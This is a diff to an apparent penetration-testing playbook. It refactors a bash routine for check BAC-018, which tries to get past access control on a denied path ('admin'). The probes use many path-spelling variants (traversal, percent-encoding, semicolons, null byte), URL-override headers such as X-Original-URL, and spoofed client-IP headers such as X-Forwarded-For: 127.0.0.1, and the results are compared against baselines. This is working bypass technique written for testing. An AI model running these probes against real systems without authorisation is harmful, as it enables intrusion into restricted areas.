@@ -1013,20 +1013,22 @@ an unguessable id) → BAC-018 again with a session, on paths refused to the low
   ```bash
   D="$E/evidence/$H/BAC-018"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
   P=admin                                         # the denied path, without its leading slash
+  # one request per row: status, size, body hash, label. $1 is the label, the rest are curl arguments.
+  row() { local l=$1; shift; : > "$D/v.body"; curl -sS --path-as-is "${HDR[@]}" -o "$D/v.body" -w '%{http_code} %{size_download} ' "$@"
+          echo "$(md5sum < "$D/v.body" | cut -c1-8) $l"; sleep "$W"; }
   # baselines: the denied path, a path that cannot exist, the login page
-  for u in "/$P" "/bac018-$RANDOM" "/login"; do
-    curl -sS --path-as-is "${HDR[@]}" -o "$D/v.body" -w "%{http_code} %{size_download} " "$T$u"; echo "$(md5sum < "$D/v.body" | cut -c1-8) BASELINE $u"; sleep "$W"; done | tee "$D/baseline.txt"
+  for u in "/$P" "/bac018-$RANDOM" "/login"; do row "BASELINE $u" "$T$u"; done | tee "$D/baseline.txt"
   # 1. path spellings (--path-as-is stops curl from normalising them)
   for v in "/$P/" "//$P" "///$P//" "/./$P" "/$P/." "/$P;/" "/$P;x=1" "/;/$P" "/.;/$P" "/x/..;/$P" "/x/../$P" "/%2e/$P" "/$P%2f" "/$P%20" "/$P%09" \
            "/$P%00" "/$P.json" "/$P.html" "/$P.css" "/$P?" "/$P/~" "/${P^^}" "/${P^}" "/%$(printf '%x' "'${P:0:1}")${P:1}" "/$P%252f" "/x%2f..%2f$P" "/$P\\"; do
-    curl -sS --path-as-is "${HDR[@]}" -o "$D/v.body" -w "%{http_code} %{size_download} " "$T$v"; echo "$(md5sum < "$D/v.body" | cut -c1-8) $v"; sleep "$W"; done | tee "$D/paths.txt"
+    row "$v" "$T$v"; done | tee "$D/paths.txt"
   # 2. URL-override headers: request an allowed path and name the denied one in the header
   for h in "X-Original-URL: /$P" "X-Rewrite-URL: /$P" "X-Override-URL: /$P" "X-Forwarded-Uri: /$P" "X-Forwarded-Prefix: /$P" "X-Request-URI: /$P"; do
-    curl -sS "${HDR[@]}" -H "$h" -o "$D/v.body" -w "%{http_code} %{size_download} " "$T/"; echo "$(md5sum < "$D/v.body" | cut -c1-8) GET / + $h"; sleep "$W"; done | tee "$D/url-headers.txt"
+    row "GET / + $h" -H "$h" "$T/"; done | tee "$D/url-headers.txt"
   # 3. client-address headers on the denied path
   for h in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Client-IP: 127.0.0.1" "X-Originating-IP: 127.0.0.1" "True-Client-IP: 127.0.0.1" \
            "X-Forwarded-For: 10.0.0.1" "Forwarded: for=127.0.0.1" "X-Forwarded-Host: localhost" "X-Custom-IP-Authorization: 127.0.0.1"; do
-    curl -sS "${HDR[@]}" -H "$h" -o "$D/v.body" -w "%{http_code} %{size_download} " "$T/$P"; echo "$(md5sum < "$D/v.body" | cut -c1-8) $h"; sleep "$W"; done | tee "$D/ip-headers.txt"
+    row "$h" -H "$h" "$T/$P"; done | tee "$D/ip-headers.txt"
   # a hit is a row whose status and body hash match none of the three baselines (bodies with a per-request token: compare sizes)
   awk 'NR==FNR{b[$1" "$3]=1; next} !(($1" "$3) in b)' "$D/baseline.txt" "$D/paths.txt" "$D/url-headers.txt" "$D/ip-headers.txt"
   ```
